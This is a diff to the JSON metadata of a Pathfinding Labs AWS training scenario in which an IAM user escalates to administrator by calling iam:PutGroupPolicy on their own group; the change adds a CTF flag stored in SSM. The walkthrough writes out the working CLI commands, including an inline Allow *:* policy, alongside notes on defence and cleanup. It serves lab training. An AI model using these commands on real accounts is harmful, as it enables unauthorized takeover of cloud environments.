@@ -32,7 +32,7 @@
     "modulePath": "modules/scenarios/single-account/privesc-self-escalation/to-admin/iam-011-iam-putgrouppolicy"
   },
   "githubUrl": "https://github.com/DataDog/pathfinding-labs/tree/main/modules/scenarios/single-account/privesc-self-escalation/to-admin/iam-011-iam-putgrouppolicy",
-  "schemaVersion": "4.1.1",
+  "schemaVersion": "4.6.0",
   "permissions": {
     "principals": [
       {
@@ -69,9 +69,9 @@
       "deployTui": "1. Launch the TUI: `plabs`\n2. Navigate to `iam-011-to-admin` in the scenarios list\n3. Press `space` to enable it\n4. Press `a` to apply"
     },
     "attack": {
-      "resourcesCreated": "| ARN | Purpose |\n| -- | -- |\n| `arn:aws:iam::{account_id}:user/pl-prod-iam-011-to-admin-paul` | Vulnerable user with PutGroupPolicy permission on their own group |\n| `arn:aws:iam::{account_id}:group/pl-prod-iam-011-to-admin-escalation-group` | Target group that pl-prod-iam-011-to-admin-paul belongs to |",
+      "resourcesCreated": "| ARN | Purpose |\n| -- | -- |\n| `arn:aws:iam::{account_id}:user/pl-prod-iam-011-to-admin-paul` | Vulnerable user with PutGroupPolicy permission on their own group |\n| `arn:aws:iam::{account_id}:group/pl-prod-iam-011-to-admin-escalation-group` | Target group that pl-prod-iam-011-to-admin-paul belongs to |\n| `arn:aws:ssm:{region}:{account_id}:parameter/pathfinding-labs/flags/iam-011-to-admin` | CTF flag stored in SSM Parameter Store, readable after gaining admin access |",
       "demoAttack": {
-        "executing": "The script will:\n1. Display a step-by-step walkthrough with color-coded output\n2. Show the commands being executed and their results\n3. Verify successful privilege escalation",
+        "executing": "The script will:\n1. Display a step-by-step walkthrough with color-coded output\n2. Show the commands being executed and their results\n3. Verify successful privilege escalation\n4. Capture the CTF flag from SSM Parameter Store using the newly acquired admin access",
         "resourcesCreated": "- Inline group policy (`EscalatedAdminAccess`) added to `pl-prod-iam-011-to-admin-escalation-group`",
         "nonInteractive": "```bash\nplabs demo --list\nplabs demo iam-011-iam-putgrouppolicy\n```",
         "tui": "1. Launch the TUI: `plabs`\n2. Navigate to `iam-011-to-admin` in the scenarios list\n3. Press `r` to run the demo script"
@@ -95,7 +95,7 @@
         "detonationLogs": "_Detonation log integration (Stratus Red Team / Grimoire) is planned for a future release._"
       }
     },
-    "solution": "# Guided Walkthrough: Self-Escalation via iam:PutGroupPolicy\n\nThis scenario demonstrates a self-escalation vulnerability where a user has permission to put inline policies on a group they belong to. The user `pl-prod-iam-011-to-admin-paul` is a member of `pl-prod-iam-011-to-admin-escalation-group` and has `iam:PutGroupPolicy` permission scoped to that same group. By adding an administrator inline policy to their own group, the user can escalate themselves to full administrator access without touching any other principal.\n\nThis class of misconfiguration is easy to introduce accidentally. An operator grants a team member the ability to \"manage group policies\" for their own group, intending to let them maintain access controls for their team. What they've actually done is grant the user the ability to grant themselves any permission, including `AdministratorAccess`. IAM does not prevent a user from calling `PutGroupPolicy` on a group they are a member of \u2014 that policy decision is left entirely to the granting principal.\n\nIn real environments this pattern appears when teams self-manage their IAM groups, when automation accounts need to update group policies dynamically, or when a broad `iam:*` grant is scoped down to a specific group ARN that the user happens to belong to.\n\n## The Challenge\n\nYou start with credentials for `arn:aws:iam::{account_id}:user/pl-prod-iam-011-to-admin-paul`. This user has a single meaningful permission: `iam:PutGroupPolicy` on `*`. The user is also a member of `pl-prod-iam-011-to-admin-escalation-group`, which currently has no policies attached.\n\nYour goal is to reach administrator access in the account.\n\n## Reconnaissance\n\nFirst, confirm your identity and verify the group membership that makes this attack possible.\n\n```bash\naws sts get-caller-identity --query 'Arn' --output text\n# arn:aws:iam::{account_id}:user/pl-prod-iam-011-to-admin-paul\n```\n\nCheck that `pl-prod-iam-011-to-admin-paul` is indeed a member of the escalation group:\n\n```bash\naws iam get-group \\\n  --group-name pl-prod-iam-011-to-admin-escalation-group \\\n  --query 'Users[*].UserName' \\\n  --output text\n# pl-prod-iam-011-to-admin-paul\n```\n\nConfirm the current permissions are limited by attempting a privileged call:\n\n```bash\naws iam list-users --max-items 1\n# An error occurred (AccessDenied) -- no admin access yet\n```\n\nThe pieces are in place: you control `iam:PutGroupPolicy`, you are a member of the target group, and you do not yet have admin access.\n\n## Exploitation\n\nThe attack is a single API call. Add an inline policy granting `AdministratorAccess` to the group you belong to:\n\n```bash\naws iam put-group-policy \\\n  --group-name pl-prod-iam-011-to-admin-escalation-group \\\n  --policy-name EscalatedAdminAccess \\\n  --policy-document '{\n    \"Version\": \"2012-10-17\",\n    \"Statement\": [\n      {\n        \"Effect\": \"Allow\",\n        \"Action\": \"*\",\n        \"Resource\": \"*\"\n      }\n    ]\n  }'\n```\n\nBecause `pl-prod-iam-011-to-admin-paul` is a member of the group, the new inline policy is immediately effective for that user. IAM group policies apply to all members as soon as they are written \u2014 there is no additional step required.\n\n## Verification\n\nWait a few seconds for IAM policy propagation, then verify that administrator access is now available:\n\n```bash\n# Allow up to 15 seconds for IAM propagation\nsleep 15\n\naws iam list-users --max-items 3 --output table\n# Returns a table of IAM users -- administrator access confirmed\n```\n\nIf the call succeeds, `pl-prod-iam-011-to-admin-paul` now has full `AdministratorAccess` to the account through the group's inline policy.\n\n## What Happened\n\nThe entire attack chain was a single `iam:PutGroupPolicy` call. There was no need to create new principals, assume roles, or touch any resource outside the group. The user leveraged their write access to a group they belong to in order to grant themselves administrator access \u2014 a textbook self-escalation.\n\nThis highlights a fundamental property of IAM group policies: any principal that can modify a group's policies and is a member of that group can grant themselves whatever permissions they write into the policy. Defending against this requires either preventing `iam:PutGroupPolicy` on groups where the caller is a member, or ensuring that no non-admin principal ever holds this permission at all.\n\nTo clean up the attack artifact, run `plabs cleanup iam-011-iam-putgrouppolicy` or remove the inline policy manually:\n\n```bash\naws iam delete-group-policy \\\n  --group-name pl-prod-iam-011-to-admin-escalation-group \\\n  --policy-name EscalatedAdminAccess\n```\n"
+    "solution": "# Guided Walkthrough: Self-Escalation via iam:PutGroupPolicy\n\nThis scenario demonstrates a self-escalation vulnerability where a user has permission to put inline policies on a group they belong to. The user `pl-prod-iam-011-to-admin-paul` is a member of `pl-prod-iam-011-to-admin-escalation-group` and has `iam:PutGroupPolicy` permission scoped to that same group. By adding an administrator inline policy to their own group, the user can escalate themselves to full administrator access without touching any other principal.\n\nThis class of misconfiguration is easy to introduce accidentally. An operator grants a team member the ability to \"manage group policies\" for their own group, intending to let them maintain access controls for their team. What they've actually done is grant the user the ability to grant themselves any permission, including `AdministratorAccess`. IAM does not prevent a user from calling `PutGroupPolicy` on a group they are a member of \u2014 that policy decision is left entirely to the granting principal.\n\nIn real environments this pattern appears when teams self-manage their IAM groups, when automation accounts need to update group policies dynamically, or when a broad `iam:*` grant is scoped down to a specific group ARN that the user happens to belong to.\n\n## The Challenge\n\nYou start with credentials for `arn:aws:iam::{account_id}:user/pl-prod-iam-011-to-admin-paul`. This user has a single meaningful permission: `iam:PutGroupPolicy` on `*`. The user is also a member of `pl-prod-iam-011-to-admin-escalation-group`, which currently has no policies attached.\n\nYour goal is to reach administrator access in the account.\n\n## Reconnaissance\n\nFirst, confirm your identity and verify the group membership that makes this attack possible.\n\n```bash\naws sts get-caller-identity --query 'Arn' --output text\n# arn:aws:iam::{account_id}:user/pl-prod-iam-011-to-admin-paul\n```\n\nCheck that `pl-prod-iam-011-to-admin-paul` is indeed a member of the escalation group:\n\n```bash\naws iam get-group \\\n  --group-name pl-prod-iam-011-to-admin-escalation-group \\\n  --query 'Users[*].UserName' \\\n  --output text\n# pl-prod-iam-011-to-admin-paul\n```\n\nConfirm the current permissions are limited by attempting a privileged call:\n\n```bash\naws iam list-users --max-items 1\n# An error occurred (AccessDenied) -- no admin access yet\n```\n\nThe pieces are in place: you control `iam:PutGroupPolicy`, you are a member of the target group, and you do not yet have admin access.\n\n## Exploitation\n\nThe attack is a single API call. Add an inline policy granting `AdministratorAccess` to the group you belong to:\n\n```bash\naws iam put-group-policy \\\n  --group-name pl-prod-iam-011-to-admin-escalation-group \\\n  --policy-name EscalatedAdminAccess \\\n  --policy-document '{\n    \"Version\": \"2012-10-17\",\n    \"Statement\": [\n      {\n        \"Effect\": \"Allow\",\n        \"Action\": \"*\",\n        \"Resource\": \"*\"\n      }\n    ]\n  }'\n```\n\nBecause `pl-prod-iam-011-to-admin-paul` is a member of the group, the new inline policy is immediately effective for that user. IAM group policies apply to all members as soon as they are written \u2014 there is no additional step required.\n\n## Verification\n\nWait a few seconds for IAM policy propagation, then verify that administrator access is now available:\n\n```bash\n# Allow up to 15 seconds for IAM propagation\nsleep 15\n\naws iam list-users --max-items 3 --output table\n# Returns a table of IAM users -- administrator access confirmed\n```\n\nIf the call succeeds, `pl-prod-iam-011-to-admin-paul` now has full `AdministratorAccess` to the account through the group's inline policy.\n\n## Capture the Flag\n\nAdmin access isn't the finish line \u2014 the flag is. Every Pathfinding Labs scenario stores a flag in a well-known location, and retrieving it is how you prove the end-to-end attack worked. For `to-admin` scenarios like this one, the flag lives in AWS Systems Manager Parameter Store at a predictable path under `/pathfinding-labs/flags/`. Reading it requires `ssm:GetParameter` on that specific parameter, which the `AdministratorAccess` managed policy now granted to your starting user provides implicitly.\n\nUsing your starting user credentials (which, thanks to the previous step, now hold `AdministratorAccess` through group membership), read the flag:\n\n```bash\naws ssm get-parameter \\\n  --name /pathfinding-labs/flags/iam-011-to-admin \\\n  --query 'Parameter.Value' \\\n  --output text\n# flag{...}  \u2014 your scenario-specific flag value\n```\n\nThe value printed is the flag you submit to complete the challenge. Its exact contents are deployment-specific (the default ships in `flags.default.yaml` in the repo root; vendors running hosted labs can swap in their own set via `plabs init --flag-file` or `plabs flags import`). The retrieval mechanism and path are identical across every `to-admin` scenario, so this same command works as the final step for any of them \u2014 only the scenario ID in the path changes.\n\n## What Happened\n\nThe entire attack chain was a single `iam:PutGroupPolicy` call. There was no need to create new principals, assume roles, or touch any resource outside the group. The user leveraged their write access to a group they belong to in order to grant themselves administrator access \u2014 a textbook self-escalation.\n\nThis highlights a fundamental property of IAM group policies: any principal that can modify a group's policies and is a member of that group can grant themselves whatever permissions they write into the policy. Defending against this requires either preventing `iam:PutGroupPolicy` on groups where the caller is a member, or ensuring that no non-admin principal ever holds this permission at all.\n\nTo clean up the attack artifact, run `plabs cleanup iam-011-iam-putgrouppolicy` or remove the inline policy manually:\n\n```bash\naws iam delete-group-policy \\\n  --group-name pl-prod-iam-011-to-admin-escalation-group \\\n  --policy-name EscalatedAdminAccess\n```\n"
   },
   "attackMap": {
     "nodes": [
@@ -104,7 +104,7 @@
         "label": "Starting User",
         "type": "principal",
         "subType": "iam-user",
-        "isTarget": true,
+        "isAdmin": true,
         "arn": "arn:aws:iam::{account_id}:user/pl-prod-iam-011-to-admin-paul",
         "access": {
           "type": "assumed-breach-credentials"
@@ -118,6 +118,14 @@
         "subType": "iam-group",
         "arn": "arn:aws:iam::{account_id}:group/pl-prod-iam-011-to-admin-escalation-group",
         "description": "This IAM group contains pl-prod-iam-011-to-admin-paul as a member. By adding an inline admin policy to this group, any attached permissions are immediately inherited by all group members, including the attacker.\n"
+      },
+      {
+        "id": "ctf-flag",
+        "label": "CTF Flag",
+        "type": "resource",
+        "subType": "ssm-parameter",
+        "isTarget": true,
+        "arn": "arn:aws:ssm:{region}:{account_id}:parameter/pathfinding-labs/flags/iam-011-to-admin"
       }
     ],
     "edges": [
@@ -156,6 +164,23 @@
           "Try a privileged API call -- if it succeeds, the escalation is complete."
         ],
         "commands": []
+      },
+      {
+        "from": "starting-principal",
+        "to": "ctf-flag",
+        "label": "Read CTF flag",
+        "description": "With AdministratorAccess now effective through group membership, the starting user can read the CTF flag stored in SSM Parameter Store.\n",
+        "hints": [
+          "You now have administrator access through the group policy you wrote.",
+          "The flag is stored in AWS Systems Manager Parameter Store under /pathfinding-labs/flags/.",
+          "Use ssm:GetParameter to retrieve it -- AdministratorAccess covers this implicitly."
+        ],
+        "commands": [
+          {
+            "description": "Read the CTF flag from SSM Parameter Store",
+            "command": "aws ssm get-parameter --name /pathfinding-labs/flags/iam-011-to-admin --query 'Parameter.Value' --output text"
+          }
+        ]
       }
     ]
   },
